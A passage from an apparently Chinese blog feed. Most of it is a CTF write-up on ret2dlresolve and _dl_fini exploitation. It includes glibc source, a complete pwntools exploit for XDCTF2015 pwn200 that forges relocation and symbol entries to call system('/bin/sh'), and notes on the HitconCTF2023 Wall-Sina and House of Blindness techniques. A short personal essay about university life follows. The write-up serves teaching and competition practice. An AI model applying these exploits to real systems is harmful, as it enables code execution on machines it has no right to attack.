class="literal">NULL</span></span><br><span class="line">&amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">  value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Finally, fix up the plt itself. */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line"><span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* All references to the value of l_info[DT_PLTGOT],</span></span><br><span class="line"><span class="comment">l_info[DT_STRTAB], l_info[DT_SYMTAB], l_info[DT_RELA],</span></span><br><span class="line"><span class="comment">l_info[DT_REL], l_info[DT_JMPREL], and l_info[VERSYMIDX (DT_VERSYM)]</span></span><br><span class="line"><span class="comment">have to be accessed via the D_PTR macro. The macro is needed since for</span></span><br><span class="line"><span class="comment">most architectures the entry is already relocated - but for some not</span></span><br><span class="line"><span class="comment">and we need to relocate at access time. */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DL_RO_DYN_SECTION</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) ((map)-&gt;i-&gt;d_un.d_ptr + (map)-&gt;l_addr)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> D_PTR(map, i) (map)-&gt;i-&gt;d_un.d_ptr</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>该函数查找函数对应的重定位表项通过:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line"> = (<span class="type">const</span> <span class="type">void</span> *) (D_PTR (l, l_info[DT_JMPREL])</span><br><span class="line">+ reloc_offset (pltgot, reloc_arg));</span><br></pre></td></tr></table></figure><p>即通过<code>link_map</code>中的<code>l_info</code>数组中的<code>DT_JMPREL</code>项找到<code>.rel.plt</code>地址，加上先前传入参数<code>reloc_arg</code>的偏移。这里的利用方法就是通过传入错误的<code>reloc_arg</code>，使其查找到我们伪造好的<code>.rel.plt</code>项，实现对重定位项的劫持，解析为我们想要的函数。</p><p>由延迟绑定的机制可知，我们需要先压栈我们需要的<code>reloc_arg</code>，随后调用<code>plt0</code>。并在对应地址上伪造好<code>.rel.plt</code>，<code>dynsym</code>，<code>dynstr</code>。在<code>dynstr</code>中写入想要解析的任意函数即可。</p><p>具体伪造方法以XDCTF2015 pwn200为例</p><h2 id="例"><a href="#例" class="headerlink" title="例"></a>例</h2><p>题目源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>];</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, buf);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">100</span>] = <span class="string">&quot;Welcome to XDCTF2015~!\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, buf);</span><br><span class="line">    write(<span class="number">1</span>, buf, <span class="built_in">strlen</span>(buf));</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目为32位，只开了NX，Partial RELRO<br>由于溢出长度不够，我们先进行一次栈迁移，在已知的目标地址上写入我们的伪造项<br>exp如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">#-*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line">from pwn import*</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"><span class="title function_">context</span><span class="params">(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;i386&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>, terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">debug</span><span class="params">(cmd = <span class="string">&#x27;&#x27;):</span></span></span><br><span class="line"><span class="string"><span class="params">if len(sys.argv)!=1:</span></span></span><br><span class="line"><span class="string"><span class="params">return</span></span></span><br><span class="line"><span class="string"><span class="params">cmd += &quot;&quot;&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">b system</span></span></span><br><span class="line"><span class="string"><span class="params">&quot;&quot;&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">gdb.attach(p, cmd)</span></span></span><br><span class="line"><span class="string"><span class="params">pause()</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">def exp(host = &quot;0.0.0.0&quot;, port=11451, exe = &quot;./vuln&quot;):</span></span></span><br><span class="line"><span class="string"><span class="params">  global p</span></span></span><br><span class="line"><span class="string"><span class="params">  if len(sys.argv)==1:</span></span></span><br><span class="line"><span class="string"><span class="params">    p = process(exe)</span></span></span><br><span class="line"><span class="string"><span class="params">  else:</span></span></span><br><span class="line"><span class="string"><span class="params">    p = remote(host, port)</span></span></span><br><span class="line"><span class="string"><span class="params">  pass</span></span></span><br><span class="line"><span class="string"><span class="params">  elf = ELF(&#x27;</span>./vuln<span class="string">&#x27;)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  leave_ret = 0x08049105</span></span></span><br><span class="line"><span class="string"><span class="params">  pop3 = 0x080491e9</span></span></span><br><span class="line"><span class="string"><span class="params">  pop_ebp = 0x080491eb</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  write_plt = elf.plt[&#x27;</span>write<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params">  write_got = elf.got[&#x27;</span>write<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params">  read_plt = elf.plt[&#x27;</span>read<span class="string">&#x27;]</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  plt_0    = elf.get_section_by_name(&#x27;</span>.plt<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  rel_plt  = elf.get_section_by_name(&#x27;</span>.rel.plt<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  dynsym   = elf.get_section_by_name(&#x27;</span>.dynsym<span class="string">&#x27;).header.sh_addr     </span></span></span><br><span class="line"><span class="string"><span class="params">  dynstr   = elf.get_section_by_name(&#x27;</span>.dynstr<span class="string">&#x27;).header.sh_addr     </span></span></span><br><span class="line"><span class="string"><span class="params">  bss_addr = elf.get_section_by_name(&#x27;</span>.bss<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params">  text_addr = elf.get_section_by_name(&#x27;</span>.text<span class="string">&#x27;).header.sh_addr</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  base_addr = bss_addr + 0x800</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  payload = b&quot;\x00&quot; * (112)</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += flat([read_plt, pop3, 0, base_addr, 0x100, pop_ebp, base_addr -4, leave_ret])</span></span></span><br><span class="line"><span class="string"><span class="params">  p.recv()</span></span></span><br><span class="line"><span class="string"><span class="params">  p.send(payload)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  reloc_index = base_addr + 24 - rel_plt </span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym_addr = base_addr + 32</span></span></span><br><span class="line"><span class="string"><span class="params">  align = 0x10 - ((fake_sym_addr - dynsym) &amp; 0xf)</span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym_addr += align</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  r_sym = int((fake_sym_addr - dynsym) / 0x10)</span></span></span><br><span class="line"><span class="string"><span class="params">  r_type = 0x7</span></span></span><br><span class="line"><span class="string"><span class="params">  r_info = (r_sym &lt;&lt; 8) + (r_type &amp; 0xff) </span></span></span><br><span class="line"><span class="string"><span class="params">  fake_reloc = flat([write_got, r_info])</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  st_name = fake_sym_addr + 0x10 - dynstr</span></span></span><br><span class="line"><span class="string"><span class="params">  st_bind = 0x1</span></span></span><br><span class="line"><span class="string"><span class="params">  st_type = 0x2</span></span></span><br><span class="line"><span class="string"><span class="params">  st_info = (st_bind &lt;&lt; 4) + (st_type &amp; 0xf)</span></span></span><br><span class="line"><span class="string"><span class="params">  fake_sym = flat([st_name, 0, 0, st_info])</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">  payload = flat([plt_0, reloc_index, 0x08049196, base_addr + 0x80, 0, 0])</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += fake_reloc</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += b&quot;\x00&quot; * align</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += fake_sym</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += b&quot;system\x00&quot;</span></span></span><br><span class="line"><span class="string"><span class="params">  payload = payload.ljust(0x80, b&quot;\x00&quot;)</span></span></span><br><span class="line"><span class="string"><span class="params">  payload += flat([b&quot;/bin/sh\x00&quot;])</span></span></span><br><span class="line"><span class="string"><span class="params">  payload = payload.ljust(0x100, b&quot;\x00&quot;)</span></span></span><br><span class="line"><span class="string"><span class="params">  p.send(payload)</span></span></span><br><span class="line"><span class="string"><span class="params"></span></span></span><br><span class="line"><span class="string"><span class="params">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span></span><br><span class="line"><span class="string"><span class="params">exp()</span></span></span><br><span class="line"><span class="string"><span class="params">p.interactive()</span></span></span><br></pre></td></tr></table></figure><p>注意dl相关函数占用较多栈空间，迁移之后可能出现栈生长到其他不可写段的情况，所以迁移的地址需要离bss足够远。</p><h2 id="64位情况"><a href="#64位情况" class="headerlink" title="64位情况"></a>64位情况</h2><p>存在以下区别:</p><ul><li>在32位中，<code>reloc_arg</code>作为偏移量，而在64位中作为<code>.rel.plt</code>的数组下标</li><li>结构体均升级为64位版本</li><li>version问题<br>version问题如下<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Half)</span> *vernum =</span><br><span class="line">  (<span class="type">const</span> <span class="type">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>此处把<code>(reloc-&gt;r_info)&gt;&gt;32</code>作为下标取值<code>vernum</code>，由于我们伪造的<code>(reloc-&gt;r_info)&gt;&gt;32</code>很大，导致容易取到不可读区域。</li></ul><p>解决方法之一是避免进入该循环，即使得<code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>为0，地址为<code>link_map+0x1c8</code>。然而这需要泄露ld地址，都有地址了还打ret2dl就不礼貌了。</p><p>另一种解决方案是选择不进入<code>if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)</code>的大循环，而是走else分支</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">/* We already found the symbol. The module (and therefore its load</span></span><br><span class="line"><span class="comment">address) is also known. */</span></span><br><span class="line">value = DL_FIXUP_MAKE_VALUE (l, l-&gt;addr + sym-&gt;st_value);</span><br><span class="line">result = l;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>DL_FIXUP_MAKE_VALUE</code>用于计算函数真实值。我们只需将<code>sym-&gt;st_value</code>指向某个已解析函数的got表，<code>l-&gt;addr</code>指向目标函数和已解析函数的偏移。</p><p>在不泄露ld的情况下伪造<code>l-&gt;addr</code>，我们需要伪造<code>link_map</code>，一般需要满足:<br>1.<code>link_map</code>中的<code>DT_STRTAB</code>、<code>DT_SYMTAB</code>、<code>DT_JMPREL</code>可读<br>2.<code>DT_SYMTAB</code>结构体中的<code>d_ptr</code>即<code>sym</code>，<code>*(sym+5) &amp; 0x03 != 0</code><br>3.<code>(reloc-&gt;r_info)&amp;0xff == 7</code><br>4.<code>rel_addr = l-&gt;addr + reloc-&gt;r_offset</code>即原先需要修改的got表地址有可写权限<br>5.<code>l-&gt;l_addr + sym-&gt;st_value</code> 为system的地址</p><h1 id="dl-fini的利用"><a href="#dl-fini的利用" class="headerlink" title="_dl_fini的利用"></a><code>_dl_fini</code>的利用</h1><h2 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h2><p>该函数在ld.so中，在exit时调用，并对<code>.fini</code>和<code>.fini_array</code>中函数进行调用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Is there a destructor function? */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span></span><br><span class="line">|| (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>))</span><br><span class="line">  &#123;</span><br><span class="line"><span class="comment">/* When debugging print a message first. */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">&amp; DL_DEBUG_IMPCALLS, <span class="number">0</span>))</span><br><span class="line">_dl_debug_printf (<span class="string">&quot;\ncalling fini: %s [%lu]\n\n&quot;</span>,</span><br><span class="line"> DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">ns);</span><br><span class="line"><span class="comment">/* First see whether an array is given. */</span></span><br><span class="line"><span class="keyword">if</span> (l-&gt;l_info[DT_FINI_ARRAY] != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">ElfW(Addr) *<span class="built_in">array</span> =</span><br><span class="line">  (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">/ <span class="keyword">sizeof</span> (ElfW(Addr)));</span><br><span class="line"><span class="keyword">while</span> (i-- &gt; <span class="number">0</span>)</span><br><span class="line">((<span class="type">fini_t</span>) <span class="built_in">array</span>[i]) ();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line"><span class="comment">/* Next try the old-style destructor. */</span></span><br><span class="line"><span class="keyword">if</span> (ELF_INITFINI &amp;&amp; l-&gt;l_info[DT_FINI] != <span class="literal">NULL</span>)</span><br><span class="line">DL_CALL_DT_FINI</span><br><span class="line">(l, l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里对<code>.fini_array</code>的定位是通过<code>l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>实现的，这就给了我们操作的空间</p><h2 id="HitconCTF2023-Wall-Sina"><a href="#HitconCTF2023-Wall-Sina" class="headerlink" title="HitconCTF2023 Wall-Sina"></a>HitconCTF2023 Wall-Sina</h2><p>源码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buff[<span class="number">0x48</span>];</span><br><span class="line"><span class="type">void</span> *<span class="type">const</span> gift = main;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    read(STDIN_FILENO, buff, <span class="number">0x40</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buff);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>保护全开<br>栈上残留了指针<code>_rtld_global</code>和<code>_rtld_global._dl_ns[0]._ns_loaded</code>，读<code>rtld_global</code>结构体源码可知，<code>_ns_loaded</code>是结构体<code>link_map</code>的指针<br>故我们可以通过fmt任意写在<code>link_map</code>的第一项，也就是<code>l_addr</code>处写任意地址。<br>题目在<code>.data.rel</code>保留了一个main的指针，且在<code>.fini_array</code>后不远处，故我们可以改写<code>l_addr</code>的LSB，使<code>l-&gt;l_addr+ l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr</code>指向该指针，达成第二次fmt。在泄露各地址之后还能再该<code>l_addr</code>使<code>.fini</code>定位到main达成第三次fmt。</p><h2 id="House-of-Blindness"><a href="#House-of-Blindness" class="headerlink" title="House of Blindness"></a>House of Blindness</h2><p>该手法无需泄露地址，需要mmap相关的任意写</p><p>依旧是改写<code>l_addr</code>的LSB，使<code>l-&gt;l_addr + l-&gt;l_info[DT_FINI]-&gt;d_un.d_ptr</code>指向目标函数。然而<code>.dynamic</code>很大，超过了256bytes，这意味着可能需要爆破一个byte。</p><p>该手法给出了不用爆破的解决方案。使用<code>.dynamic</code>段中的<code>DT_DEBUG</code>项。该项指向了一个位于ld.so中的<code>_r_debug</code>结构，且有可写权限，可以通过覆盖LSB达成对libc函数的调用。<br>由于ld.so地址在libc.so之后，地址显然更大，可以将<code>l_addr</code>改为负数(补码形式)来解决。<br>另外，此时的rdi正好落在<code>dl_load_lock</code>上，位于ld.so中，也是可控的。</p><hr><p>参考资料:</p><ul><li><a href="https://bbs.kanxue.com/thread-253833.htm#msg_header_h2_2">[看雪]dl_runtime_resolve结合源码分析及常见的几种攻击手法</a></li><li><a href="https://github.com/firmianay/CTF-All-In-One/blob/master/doc/6.1.3_pwn_xdctf2015_pwn200.md">CTF-All-In-One</a></li><li><a href="https://zhuanlan.zhihu.com/p/657009223">[知乎]HitconCTF2023 pwn Wall-Sina wp</a></li><li><a href="https://hackmd.io/jmE0VvcTQaaJm6SEWiqUJA#refining-our-exploit-with-_r_debug">[Hackmd]house of blindness</a></li><li>《程序员的自我修养》</li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 在逃离之后</title>
      <link href="/2023%EF%BC%9A%E5%9C%A8%E9%80%83%E7%A6%BB%E4%B9%8B%E5%90%8E/"/>
      <url>/2023%EF%BC%9A%E5%9C%A8%E9%80%83%E7%A6%BB%E4%B9%8B%E5%90%8E/</url>
      
        <content type="html"><![CDATA[<p>熬过了艰难的期末，终于有点精力写些想表达的东西。这种感觉一如高考完的那个暑假里，在迷茫中写写划划，企图在文字中找到一种力量感。之后的一年，过得像中学墙上的模范议论文，填满了字，读不出意思。即使在人生走马灯里，也是被”a few years later”一笔带过的水平。当然，好的故事总要学会在不该精彩的地方不精彩。正好前年的故事也忘讲了，那就从头讲起吧。</p><p>高考完的日子，一拨人忙着缅怀，一拨人忙着逃离。我理应也忙着逃离。但忍不住给喜欢的女生发了条消息，顺理成章地，让本就不太一帆风顺的逃离之旅雪上加霜。在得手之前，在逃离之后，我在十八岁生日那天一遍遍梳理着自己既不岁月静好也不波澜壮阔的前半生。人总是在日复一日里渴望遇见改变，直到意识到改变永远不会奔他而来，这时候的他，浑然不觉已经在等待着一声发令——一个意义非凡的日子、一句话、一个人。那天我真正决定要逃离，我知道我的一部分还困在那里。它不在学校里面，而在沿着地基往下五千万公里深处。那里有一条根，贯穿我受教育的前半生，蔓延，生长，在生命的终点朝我挥手。</p><p>我又想到大一。大一的关键词是“悬浮”。那是什么感觉，就像一阵风托起，你和周遭世界就浮到了半空中。你的力量，在这个没有支点的空中轻飘飘的，稍不注意还会失去平衡。于是你和周围的人一起飘啊飘。混沌运动里没有人知道目的地。</p><p>在这个读研几乎成为唯一出路的专业，追求极致的分数是生存的本能。我看到一些优秀的同学为了考试奉献了自己大部分时间，然后公开或私下用“卷”评价着其他努力的同学，转头又在某些交流群里以“X神”“X佬”互相吹捧。我无意指谪，选择这种活法的是环境，而非他们。但从小到大看同样的剧本多少会审美疲劳，何况叛逆如我。于是我开始翘课，起初只翘C语言一类的水课，然后开始间歇翘微积分一类的正课，直到发现进度跟不上，索性一节都不去了。好在考前力挽狂澜，最后杂技般安稳地落在保研线里。</p><p>翘出来的时间也未必干了什么正事，除了睡觉，顺利完成的只记得通过凝聚招新。剩下的都是些荒唐的失败：挑战一人完成电赛题目（然后在截稿前发现pcb封装画反）、挑战同一天打校内acm和台球校赛、挑战读完图书馆里各种稀奇古怪的领域的代表作品。不带来收获的失败，甚至有些乏味。乏味当然是相对的，一直输也比不上场好。</p><p>后面就是以前提过的老剧情，观摩ASC，参加国赛，重新融入凝聚balabala。最重要的，大概是找到了热爱的方向和一群志同道合的人。</p><p>这是正面的影响，从负面来说，一个明确的方向，让我对课内更不上心了。据统计，我23下半年中后期一周平均只上了2.5节课，又已知我在复习期间相当浮躁（且沉迷R6），易得：我的绩点将惨不忍睹。（本文动笔时，我一度相信半导体物理将迎来我的第一门挂科。由于本文跨越一个多月才完成，写到本段时成绩早就出了，我现在知道我被捞了，有道是：天无绝人之路）这种成绩基本宣告和保研无缘了。</p><p>这个结果并没有引起我多少触动，好像早就知道会走到这一步。我想，即使让时间倒流两个月，提前开始复习，我依旧会在能感知到危险的那个节点之前挥霍时间，最后依旧是勉勉强强复习个大概的结果。如果我减少翘课次数，我会因为增添的信心，继续延后那个认真复习的节点，最后的结果也不会改变多少。换句话说，复习时间、翘课，这些变量如何改变，也无法改变其结果。考试的结局，在失败这里收敛了。这不是改头换面的宿命论，我对待学科的热情，始终控制着收敛的方向。只要不对关键变量做出改变，再多的尝试和悔恨也没有意义。一切都是我应得的，这样的观点让我轻易就接受了现实。</p><p>这也算逃离吗？从行为上更像被驱逐，看原因却像早有预谋。从一条明确的赛道，走向未知的旷野。好处是不用再付出维持选择权的成本，这大概是一种自由，可是自由将落向何处，我不知道。如果明天的安全感不能托付某个制度、某个组织，那我选择交给明天的自己。</p><p>那年高三，空气阴冷，自习课，班主任来到跟前，我还沉浸在卡拉马佐夫兄弟的世界浑然不觉。我相信那一刻我已经逃离了，透过层层书卷和天花板，享受短暂的祥和。此后的人生，我必须不停逃下去，才能躲过身后的崩坏。</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 摸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强网拟态异闻录</title>
      <link href="/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%BC%82%E9%97%BB%E5%BD%95/"/>
      <url>/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%E5%BC%82%E9%97%BB%E5%BD%95/</url>
      
